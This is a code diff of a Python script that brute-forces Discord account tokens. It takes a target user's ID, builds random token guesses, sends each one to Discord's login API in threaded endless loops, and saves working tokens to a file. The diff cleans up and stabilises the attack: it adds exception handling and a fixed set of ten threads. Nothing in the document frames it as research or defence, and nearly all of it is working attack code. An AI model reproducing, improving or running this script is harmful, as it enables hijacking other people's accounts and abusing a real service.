@@ -1,22 +1,9 @@
-import threading
-from discord.ext import commands
-import discord
-import pyautogui
-import time
-from requests import post
-from random import randint
-import re
-import http.client
-import random
-import json
-import requests
-from threading import Thread
-from requests import Session
 import base64
+import random
 import string
-import sys
+import threading
+import requests
 import os
-
 
 def randstr(lenn):
     alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
@@ -25,9 +12,7 @@ def randstr(lenn):
         text += alpha[random.randint(0, len(alpha) - 1)]
     return text
 
-
 def spammer():
-
     if not os.path.exists('token-brute.txt'):
         with open('token-brute.txt', 'w') as f:
             pass
@@ -38,14 +23,11 @@ def spammer():
     id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
     id_to_token = str(id_to_token)[2:-1]
 
-    def bruteforece():
-        while id_to_token == id_to_token:
-            token = id_to_token + '.' + ('').join(
-                random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
-                        '').join(random.choices(string.ascii_letters + string.digits, k=25))
-
+    def bruteforce():
+        while True:
+            token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ''.join(
+                random.choices(string.ascii_letters + string.digits, k=25))
             headers = {'Authorization': token}
-
             login = requests.get('https://discord.com/api/v10/auth/login', headers=headers)
             try:
                 if login.status_code == 200:
@@ -54,16 +36,15 @@ def spammer():
                         f.write(f'{token}\n')
                 else:
                     print('[-] INVALID' + ' ' + token)
+            except Exception as e:
+                print('Error:', e)
             finally:
                 print('')
 
-    def thread():
-        while True:
-            threading.Thread(target=bruteforece).start()
+    def start_threads():
+        for _ in range(10):
+            threading.Thread(target=bruteforce).start()
 
-    thread()
-
-    exit = input('press any key: ')
-    exit = spammer()
+    start_threads()
 
 spammer()
